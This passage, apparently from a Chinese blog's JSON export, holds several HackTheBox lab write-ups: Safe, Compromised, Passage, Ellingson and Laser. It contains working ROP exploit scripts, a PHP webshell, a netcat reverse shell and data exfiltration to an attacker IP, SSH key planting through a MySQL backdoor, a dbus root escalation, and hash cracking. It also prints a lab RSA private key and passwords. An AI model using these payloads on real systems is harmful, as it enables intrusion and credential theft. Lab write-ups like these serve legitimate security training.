1337)p.recvline()p.sendline(payload)leaked_puts = u64(p.recvline().strip()[7:-11].ljust(8,\"\\x00\"))log.info(\"Leaked puts address: %x\" % leaked_puts)libc_base = leaked_puts - 0x68f90log.info(\"libc_base: %x\" % libc_base)sh = p64(0x161c19 + libc_base)payload = junk + pop_rdi + sh + plt_systemp.recvline()p.sendline(payload)p.interactive() user flag任意一种打到user shell： 可以写ssh公钥方便后续操作 提权信息前面也看到后用户目录除了user.txt还有一些其他文件，下载下来查看： 12scp user@10.10.10.147:~/IMG* .scp user@10.10.10.147:~/*.kdbx . john一个keypass文件和6张图，可以尝试破解，分别使用每张图作为密钥文件转换hash后破解： 123456789/opt/john/run/keepass2john MyPasswords.kdbx &gt; MyPasswords.kdbx.john; for img in $(ls IMG*); do /opt/john/run/keepass2john -k $img MyPasswords.kdbx; done &gt;&gt; MyPasswords.kdbx.johnMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88aeMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390fMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2 破解出来密码： 123sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;seclists&#x2F;Passwords&#x2F;Leaked-Databases&#x2F;rockyou-30.txt hash.txtbullshit keepass密钥文件是IMG_0547.JPG ，打开后得到root 密码： root flagsu切到root： 参考资料 HTB: Safe | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/10/26/htb-safe.html https://www.hackthebox.eu/home/machines/writeup/199 HackTheBox - Safe - YouTubehttps://www.youtube.com/watch?v=CO_g3wtC7rk&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Compromised - HackTheBox","slug":"Compromised-HackTheBox","date":"2020-09-22T07:16:37.000Z","updated":"2021-01-25T01:05:15.996Z","comments":true,"path":"2020/09/22/Compromised-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/09/22/Compromised-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/276 10.10.10.207 端口扫描常规22和80: 80是一个LiteCart商城： 目录扫描1234gobuster dir -u http://10.10.10.207/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 30/shop (Status: 301)/backup (Status: 301)/server-status (Status: 403) backupbackup直接有个备份文件，下载下来： admin/login.phpadmin/login.php中有一句注释，里面是日志文件名，会将用户名密码写到这个日志里： 1//file_put_contents(\"./.log2301c9430d8593ae.txt\", \"User: \" . $_POST['username'] . \" Passwd: \" . $_POST['password']); .log2301c9430d8593ae.txt然后直接访问这个日志文件，得到admin密码： 1User: admin Passwd: theNextGenSt0r3!~ LiteCart登录进去，得到版本号是LiteCart 2.1.2： 这个版本有一个任意文件上传： LiteCart 2.1.2 - Arbitrary File Upload - PHP webapps Exploithttps://www.exploit-db.com/exploits/45267 webshell直接用exp打能写文件，但执行是空白，修改下exp写phpinfo确认下： 1python litecart.py -t http:&#x2F;&#x2F;10.10.10.207&#x2F;shop&#x2F;admin&#x2F; -u &#39;admin&#39; -p &#39;theNextGenSt0r3!~&#39; 可以看到很多函数都被禁用了，那么我们就需要bypass disable_functions，因为是php 7.2.24，可以使用： PHP 7.0 &lt; 7.4 (Unix) - ‘debug_backtrace’ disable_functions Bypass - PHP local Exploithttps://www.exploit-db.com/exploits/48072 AntSword 不过也可以直接用蚁剑的shel上去翻文件： 然后直接用插件，一键bypass： mysql查看/etc/passwd知道mysql用户可以用于登录： 1mysql:x:111:113:MySQL Server,,,:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;bin&#x2F;bash config.inc.php查看数据库配置文件/var/www/html/shop/includes/config.inc.php得到数据库密码信息： 123456789// Database define('DB_TYPE', 'mysql'); define('DB_SERVER', 'localhost'); define('DB_USERNAME', 'root'); define('DB_PASSWORD', 'changethis'); define('DB_DATABASE', 'ecom'); define('DB_TABLE_PREFIX', 'lc_'); define('DB_CONNECTION_CHARSET', 'utf8'); define('DB_PERSISTENT_CONNECTIONS', 'false'); mysql.func蚁剑牛逼，正常应该是bypass之后的shell连接mysql，蚁剑一键检测然后连接，在mysql.func发现一个udf，后门： mysql权限： mysql ssh然后就是写公钥到mysql用户authorized_keys中, 以mysql用户ssh登录： 1SELECT exec_cmd(&#39;echo ssh-rsa xxxxxxxx &gt;&gt; ~&#x2F;.ssh&#x2F;authorized_keys&#39;); strace-log.dat然后在strace-log.dat中发现另一个密码信息： 12345678910111213mysql@compromised:~$ cat strace-log.dat | grep password22102 03:11:06 write(2, \"mysql -u root --password='3*NLJE\"..., 39) = 3922227 03:11:09 execve(\"/usr/bin/mysql\", [\"mysql\", \"-u\", \"root\", \"--password=3*NLJE32I$Fe\"], 0x55bc62467900 /* 21 vars */) = 022227 03:11:09 write(2, \"[Warning] Using a password on th\"..., 73) = 7322102 03:11:10 write(2, \"mysql -u root --password='3*NLJE\"..., 39) = 3922228 03:11:15 execve(\"/usr/bin/mysql\", [\"mysql\", \"-u\", \"root\", \"--password=changeme\"], 0x55bc62467900 /* 21 vars */) = 022228 03:11:15 write(2, \"[Warning] Using a password on th\"..., 73) = 7322102 03:11:16 write(2, \"mysql -u root --password='change\"..., 35) = 3522229 03:11:18 execve(\"/usr/bin/mysql\", [\"mysql\", \"-u\", \"root\", \"--password=changethis\"], 0x55bc62467900 /* 21 vars */) = 022229 03:11:18 write(2, \"[Warning] Using a password on th\"..., 73) = 7322232 03:11:52 openat(AT_FDCWD, \"/etc/pam.d/common-password\", O_RDONLY) = 522232 03:11:52 read(5, \"#\\n# /etc/pam.d/common-password -\"..., 4096) = 144022232 03:11:52 write(4, \"[sudo] password for sysadmin: \", 30) = 30 user flag13*NLJE32I$Fe 上面得到的密码是sysadmin的密码，切换过去得到user flag: 提权信息前面包含admin密码的日志文件创建日期是2020-05-29，可以查看在这之前有过修改的文件, 发现pam有过修改，可能是openssh后门： 123456find / -newermt \"2020-05-29\" ! -newermt \"2020-09-22\" -type f &gt; miao.txt.../lib/x86_64-linux-gnu/security/.pam_unix.so/lib/x86_64-linux-gnu/security/pam_unix.so... zephrax/linux-pam-backdoor: Linux PAM Backdoorhttps://github.com/zephrax/linux-pam-backdoor 逆向分析直接把so拉下来分析： 1scp sysadmin@10.10.10.207:&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;security&#x2F;pam_unix.so pam_unix.so 得到后门密码： 1237a6c6b657e5533456e7638326d322d$ echo &quot;7a6c6b657e5533456e7638326d322d&quot; | xxd -r -pzlke~U3Env82m2- root flag然后直接用这个密码就能切换到root，得到root.txt: 参考资料 LiteCart 2.1.2 - Arbitrary File Upload - PHP webapps Exploithttps://www.exploit-db.com/exploits/45267 PHP 7.0 &lt; 7.4 (Unix) - ‘debug_backtrace’ disable_functions Bypass - PHP local Exploithttps://www.exploit-db.com/exploits/48072 zephrax/linux-pam-backdoor: Linux PAM Backdoorhttps://github.com/zephrax/linux-pam-backdoor Compromised Writeup [HTB] | N0xi0ushttps://noxious.tech/posts/Compromised/ [HTB] Compromised · 5p4d37’s Bloghttps://d.oulove.me/2020/09/16/HTB-Compromised/ Compromised - YouTubehttps://www.youtube.com/watch?v=kyxoj6G7XQs&amp;t=1s&amp;ab_channel=DavidDavies","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Passage - HackTheBox","slug":"Passage-HackTheBox","date":"2020-09-09T06:44:02.000Z","updated":"2021-03-08T04:05:39.331Z","comments":true,"path":"2020/09/09/Passage-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/09/09/Passage-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/275 10.10.10.206 端口扫描常规22和80: 12345678910111213141516171819$ nmap -sC -sV 10.10.10.206Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-09 13:47 CSTNmap scan report for 10.10.10.206Host is up (0.070s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)| 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)|_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Passage NewsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 23.60 seconds 80Powered by CuteNews CuteNews搜索知道是NMS (News Management System) Cutenews 可以得到登录入口： 随意注册后登录后，得到版本信息： 12Powered by CuteNews 2.1.2 © 2002–2020 CutePHP.(unregistered) 搜索存在已知漏洞： CuteNews 2.0.3 - Arbitrary File Upload - PHP webapps Exploithttps://www.exploit-db.com/exploits/37474 webshell首选使用ExifTool制作一个图片马： 1exiftool -Comment='&lt;?php echo \"&lt;pre&gt;\"; system($_GET[\"cmd\"]); ?&gt;' miao.jpg 然后将后缀名改成php，直接去上传： 得到webshell(上传后文件名和用户名相关，自己找下实际路径就可以)： http://10.10.10.206/CuteNews/uploads/avatar_miao_miao.php?cmd=whoami reverse shell服务器上有nc，直接reverse shell方便后续操作： http://10.10.10.206/CuteNews/uploads/avatar_miao_miao.php?cmd=nc%2010.10.14.52%204444%20-e%20/bin/bash 信息搜集在/var/www/html/CuteNews/cdata/users目录下有很多php文件，将他们内容保存到单个文件下载下来： 1234pwd/var/www/html/CuteNews/cdata/userscat * &gt; output.txtnc 10.10.14.52 4445 &lt; output.txt 里面很多base64，解码后提取出一些SHA2-256 hash： 12345677144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e14bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cdf669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca6e9d6c8d194aad647a7b5e1ecd47c7ca24f042a772fb3802e4b81e6043d678174db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cce7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9 hash crack1hashcat -m 1400 -a 0 hashs.txt /usr/share/wordlists/rockyou.txt 破解出来两条： 12e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hackere26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1 User flaghome目录得到两个用户名，得到的密码不能ssh连接，但可以su切换到paul用户,密码是atlanta1, 用户目录得到user.txt： id_rsa_paul.ssh目录有私钥文件，可以下载下来方便后续操作： 123456789101112131415161718192021222324252627-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu&#x2F;+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4iZ2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv&#x2F;ktrWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJJjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hboksjhFoXD8m5DOYcXS&#x2F;YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQeWztv1ofs7YpizhfVypH8PxMbpv&#x2F;MR5xiB3YW0DH4Tz&#x2F;6TPFJVR&#x2F;K11nqxbkItlGQXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lrlxNsimGsGYq10ewXETFSSF&#x2F;xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAhzWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj&#x2F;A0jnjMMzR0AyP&#x2F;AEw7HmvcrSoFRx6k&#x2F;NtzaePzIa2CuGDkz&#x2F;G6OEhNVd2S8&#x2F;enlxf51MIO&#x2F;k7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBioGS3B3ngOKyHVGFeQrpwT1a&#x2F;cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX&#x2F;6y6X1Vbtk7kXsMCgYEA1WBELuhRFMDaEIdfA16CotRuwwpQS&#x2F;WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSRAHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP19pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrFd8dj23LOuJ9MVdmz&#x2F;K92OudHzsko5ND1gHBa+I9YB8ns&#x2F;KVwczjv9pBoNdEI5KOsnYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO&#x2F;rvoYf62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyMUxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDsOR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw&#x3D;&#x3D;-----END RSA PRIVATE KEY----- id_rsa_nadavnadav和paul的ssh私钥是同一个，可以直接登录到nadav用户： 提权信息suid文件发现dbus： 1234find / -perm -u=s -type f 2&gt;/dev/null.../usr/lib/dbus-1.0/dbus-daemon-launch-helper... 相关资料： USBCreator D-Bus Privilege Escalation in Ubuntu Desktophttps://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/ 满足前置条件，nadav用户在sudo组中： 12nadav@passage:~$ iduid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) 提权 &amp; root flag12echo \"your id_rsa.pub key\" &gt; ~/authorized_keysgdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/authorized_keys /root/.ssh/authorized_keys true 然后就可以直接root登录，得到root.txt: 参考资料 CuteNews 2.0.3 - Arbitrary File Upload - PHP webapps Exploithttps://www.exploit-db.com/exploits/37474 USBCreator D-Bus Privilege Escalation in Ubuntu Desktophttps://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/ Passage Writeuphttps://www.dedinfosec.tech/Passage.php Hack-The-Box-walkthrough[passage] | lUc1f3r11’s bloghttps://fdlucifer.github.io/2020/09/07/passage/ Passage - YouTubehttps://www.youtube.com/watch?v=Yj8cAn1VwlQ&amp;ab_channel=DavidDavies","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Ellingson - HackTheBox","slug":"Ellingson-HackTheBox","date":"2020-09-08T07:26:52.000Z","updated":"2021-09-08T07:28:29.260Z","comments":true,"path":"2020/09/08/Ellingson-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/09/08/Ellingson-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/189 10.10.10.139 端口扫描22和80: 1234567891011121314151617181920$ nmap -sC -sV 10.10.10.139Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-08 14:22 CSTNmap scan report for 10.10.10.139Host is up (0.070s latency).Not shown: 998 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)| 256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)|_ 256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)| http-title: Ellingson Mineral Corp|_Requested resource was http://10.10.10.139/index|_http-server-header: nginx/1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 61.28 seconds 80页面一些新闻，可以作为参考提示信息： 任意一个页面构造报错，可以发现python debug： shell可以通过debug执行python代码，不能直接shell，可以查看文件之类的,读取私钥是加密的，但可以写公钥进去后ssh连接： 12345os.listdir('/home')os.listdir('/home/hal/')os.listdir('/home/hal/.ssh')with open('/home/hal/.ssh/id_rsa','r') as f: f.read()with open('/home/hal/.ssh/authorized_keys','a') as f: f.write('\\nssh-rsa xxxxxx') 信息hal用户在adm组中，可以查看日志之类的(官方的和ippsec的都是adm可以查看backup,可能机器设置问题，0xdf博客说重置后会变成易受攻击状态，因为定时任务设置的是每天一次backup)： 根据提示生成小字典，破解出来margo用户密码,直接rockyou硬跑也行： 12345grep -i -e love -e secret -e sex -e god /usr/share/wordlists/rockyou.txt &gt; grepped_rockyou sudo john --wordlist=grepped_rockyou hash.txt$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:iamgod$08 shadow.bak12345...theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj&#x2F;aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot&#x2F;:17964:0:99999:7:::hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0&#x2F;i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::margo:$6$Lv8rcvK8$la&#x2F;ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G&#x2F;kbd72poeAnyJL4c1:17964:0:99999:7:::duke:$6$bFjry0BT$OtPFpMfL&#x2F;KuUZOafZalqHINNX&#x2F;acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc&#x2F;:17964:0:99999:7::: user flagmargo用户登录，得到user.txt: 提权信息suid发现一个garbage： garbage &amp; root flag有ASLR,NX的rop,puts泄漏函数地址，计算base，之后rop,直接打会放弃suid，还需要加入setuid,参考资料里0xdf的很详细 1234rip offset 136rop-tool gadget garbage | grep rdi0x000000000040179b -&gt; pop rdi; ret ; exp.py1234567891011121314151617181920212223242526272829303132#!/usr/bin/env pythonfrom pwn import *#context.log_level = \"DEBUG\"sshConn = ssh(host='10.10.10.139', user='margo', password='iamgod$08')garbage = sshConn.process('garbage')junk = \"A\" * 136 # offset from patternpop_rdi = p64(0x40179b) # rop-tool gadget garbage | grep rdiputs_plt = p64(0x401050) # objdump -D garbage | grep puts@GLIBCputs_got = p64(0x404028) # objdump -D garbage | grep puts@GLIBCmain = p64(0x401619) # objdump -D garbage | grep '&lt;main&gt;' stage_1 = junk + pop_rdi + puts_got + puts_plt + maingarbage.sendline(stage_1)garbage.recvuntil(\"access denied.\\n\")leaked_puts = u64(garbage.recvline()[:-1].ljust(8, '\\x00'))log.success(\"Leaked puts address: 0x%x\" % leaked_puts)garbage.recvuntil(\"Enter access password: \")# offsetslibc_puts = 0x809c0 # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep \" puts@@GLIBC\"libc_exec_sh = 0x4f322 # one_gadget gadget garbagelibc_setuid = 0xe5970 # readelf -s libs/libc6_2.27-3ubuntu1_amd64/libc.so.6 | grep \" setuid@@GLIBC\"libc_base = leaked_puts - libc_putsstage_2 = junk + pop_rdi + p64(0) + p64(libc_setuid + libc_base) + p64(libc_exec_sh + libc_base)garbage.sendline(stage_2)garbage.recvuntil(\"access denied.\")garbage.interactive() 参考资料 HTB: Ellingson | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/10/19/htb-ellingson.html https://www.hackthebox.eu/home/machines/writeup/189 HackTheBox - Ellingson - YouTubehttps://www.youtube.com/watch?v=XVYgBetSvS8&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Laser - HackTheBox","slug":"Laser-HackTheBox","date":"2020-09-08T06:19:14.000Z","updated":"2020-12-21T01:16:57.074Z","comments":true,"path":"2020/09/08/Laser-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/09/08/Laser-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/269 10.10.10.201 端口扫描22,9000,9100 12345678910111213141516171819202122232425262728293031323334353637383940414243444546$ nmap -sC -sV 10.10.10.201Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 12:53 CSTNmap scan report for 10.10.10.201Host is up (0.069s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)9000/tcp open cslistener?9100/tcp open jetdirect?1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port9000-TCP:V=7.80%I=7%D=9/7%Time=5F55BCEC%P=x86_64-apple-darwin18.6.0SF:%r(NULL,3F,\"\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0@\\0\\0\\0\\x05\\0@\\0\\0\\0\\x06\\0\\0\\SF:x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\x01\\0\\0\\x08\\x06\\0\\0SF:\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\")%r(GenericLines,3F,\"\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x0SF:4\\0@\\0\\0\\0\\x05\\0@\\0\\0\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0SF:\\0\\0\\0\\0\\?\\0\\x01\\0\\0\\x08\\x06\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\")%r(GetRequest,3SF:F,\"\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0@\\0\\0\\0\\x05\\0@\\0\\0\\0\\x06\\0\\0\\x20\\0\\xfeSF:\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\x01\\0\\0\\x08\\x06\\0\\0\\0\\0\\0\\0\\SF:0\\0\\0\\0\\0\\0\\0\")%r(HTTPOptions,3F,\"\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0@\\0\\0\\0SF:\\x05\\0@\\0\\0\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?SF:\\0\\x01\\0\\0\\x08\\x06\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\")%r(RTSPRequest,3F,\"\\0\\0\\xSF:18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0@\\0\\0\\0\\x05\\0@\\0\\0\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\SF:0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\x01\\0\\0\\x08\\x06\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0SF:\\0\\0\")%r(RPCCheck,3F,\"\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0@\\0\\0\\0\\x05\\0@\\0\\0\\SF:0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\x01\\0\\0\\xSF:08\\x06\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\")%r(DNSVersionBindReqTCP,3F,\"\\0\\0\\x18\\SF:x04\\0\\0\\0\\0\\0\\0\\x04\\0@\\0\\0\\0\\x05\\0@\\0\\0\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\xSF:01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\x01\\0\\0\\x08\\x06\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\SF:0\")%r(DNSStatusRequestTCP,3F,\"\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0@\\0\\0\\0\\x05SF:\\0@\\0\\0\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\xSF:01\\0\\0\\x08\\x06\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\")%r(Help,3F,\"\\0\\0\\x18\\x04\\0\\0\\SF:0\\0\\0\\0\\x04\\0@\\0\\0\\0\\x05\\0@\\0\\0\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\xSF:04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\x01\\0\\0\\x08\\x06\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\")%r(SSSF:LS